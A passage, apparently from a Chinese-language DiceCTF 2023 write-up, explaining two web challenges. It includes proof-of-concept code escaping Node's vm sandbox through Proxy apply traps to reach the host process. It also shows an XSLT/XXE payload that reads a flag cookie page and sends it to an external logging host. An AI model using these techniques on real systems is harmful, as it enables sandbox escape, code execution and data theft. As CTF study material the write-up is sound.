@@ -1,0 +1,159 @@
+process.mainModule = null; // 🙃
+
+app.use(express.static("public"));
+
+app.post("/api/verify", (req, res) => {
+    let { token, secretOrPrivateKey } = req.body;
+    try {
+        token = unserialize(token);
+        secretOrPrivateKey = unserialize(secretOrPrivateKey);
+        res.json({
+            success: true,
+            data: jwt.verify(token, secretOrPrivateKey)
+        });
+    }
+    catch {
+        res.json({
+            success: false,
+            data: "Verification failed"
+        });
+    }
+});
+
+app.listen(PORT, () => console.log(`web/jwtjail listening on port ${PORT}`));
+```
+
+靠著 vm 把你丟進去的 data 放在另一個 context，然後呼叫 jwt lib，因此目的就是在 jwt lib 處理的過程中找到可以 escape 的地方。
+
+而解法是我們可以幫一個 function 加上 proxy，如果呼叫到 function，就會先呼叫到 proxy 的 apply
+
+``` js
+var p = new Proxy(_ => _, {
+  apply(target, thisArg, argumentsList) {
+    console.log('apply')
+  }
+})
+p() // apply
+```
+
+而這個 apply 的第三個參數 `argumentsList` 是來自外界的 object，就可以靠著這個參數來逃出 VM。
+
+除此之外，雖然 `process.mainModule` 被刪掉了，但可以用 `process.binding("spawn_sync")` 來達成執行程式碼。
+
+一個簡單的 PoC 像這樣：
+
+``` js
+"use strict";
+const vm = require("vm");
+
+const ctx = { codeGeneration: { strings: false, wasm: false }};
+const unserialize = (data) => new vm.Script(`"use strict"; (${data})`)
+    .runInContext(
+        vm.createContext(Object.create({console}), ctx),
+        { timeout: 250 }
+    );
+
+var data = `{
+    key: {
+        toString: new Proxy(_ => _, {
+            apply(a, b, c) {
+                console.log(c.constructor.constructor("return this")().process.pid)
+            }
+        })
+    }
+}`
+
+try {
+    data = unserialize(data);
+    console.log(data['key'].toString())
+} catch(err) {
+    console.log(err)
+}
+```
+
+而賽後的 Discord 討論裡面，也有人提到可以利用雙重 proxy 達成「只要存取 object 的值就可以 escape」，像這樣：
+
+``` js
+"use strict";
+const vm = require("vm");
+
+const ctx = { codeGeneration: { strings: false, wasm: false }};
+const unserialize = (data) => new vm.Script(`"use strict"; (${data})`)
+    .runInContext(
+        vm.createContext(Object.create({console}), ctx),
+        { timeout: 250 }
+    );
+
+var data = `new Proxy({}, {
+    get: new Proxy(_=>_, {
+        apply(a,b,c) {
+            console.log(c.constructor.constructor("return this")().process.pid)
+        }
+    })
+})`
+
+try {
+    data = unserialize(data);
+    data['key'];
+} catch(err) {
+    console.log(err)
+}
+```
+
+作者 writeup：https://brycec.me/posts/dicectf_2023_challenges
+
+## Web - impossible XSS (0 solves)
+
+這題很酷，程式碼很簡單：
+
+``` js
+const express = require('express');
+const cookieParser = require('cookie-parser');
+const app = express();
+app.use(cookieParser());
+
+app.get('/', (req, res) => {
+    // free xss, how hard could it be?
+    res.end(req.query?.xss ?? 'welcome to impossible-xss');
+});
+
+app.get('/flag', (req, res) => {
+    // flag in admin bot's FLAG cookie
+    res.end(req.cookies?.FLAG ?? 'dice{fakeflag}');
+});
+
+app.listen(8080);
+```
+
+你有一個 free xss，但是在 admin bot 裡面有一行 `await page.setJavaScriptEnabled(false);`，直接把 JS 關掉。
+
+解法是用 XSLT 加上 XXE，像這樣：
+
+``` js
+ss = `<?xml version="1.0"?>
+<!DOCTYPE a [
+   <!ENTITY xxe SYSTEM  "https://impossible-xss.mc.ax/flag" >]>
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
+  <xsl:template match="/asdf">
+    <HTML>
+      <HEAD>
+        <TITLE></TITLE>
+      </HEAD>
+      <BODY>
+        <img>
+          <xsl:attribute name="src">
+            https://hc.lc/log2.php?&xxe;
+          </xsl:attribute>
+        </img>
+      </BODY>
+    </HTML>
+  </xsl:template>
+</xsl:stylesheet>`
+
+xml=`<?xml version="1.0"?>
+<?xml-stylesheet type="text/xsl" href="data:text/plain;base64,${btoa(ss)}"?>
+<asdf></asdf>`
+payload=encodeURIComponent(xml)
+```
+
+作者的 writeup：https://blog.ankursundara.com/dicectf23-writeups/
